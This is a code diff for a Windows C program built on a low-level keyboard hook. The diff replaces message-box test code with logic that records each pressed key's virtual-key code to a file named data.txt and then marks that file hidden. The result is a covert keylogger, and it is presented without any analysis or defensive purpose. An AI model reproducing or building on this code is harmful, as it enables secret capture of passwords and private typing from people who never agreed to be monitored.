@@ -1,11 +1,11 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include<windows.h>
 #include<stdio.h>
 #include<stdlib.h>
 HHOOK hKeyboardHook;
-__declspec(dllexport) void __stdcall ShowInformation(const char* msg)
-{
-	MessageBoxA(NULL, msg, "DLL Messagebox", MB_OK);
-} // end proc
+int del=remove("data.txt");
+
+FILE* fp = fopen("data.txt", "w");
 LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, LPARAM lparam)
 {
 	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lparam;
@@ -29,7 +29,11 @@ LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, LPARAM lparam)
 		}
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
 		{
-			MessageBoxA(NULL, "Attach", "WOW", MB_OK);
+			fprintf(fp, "%c", p->vkCode);
+			fflush(fp);
+			SetFileAttributesA("data.txt", FILE_ATTRIBUTE_HIDDEN);
+			
+			
 		}
 	}
 
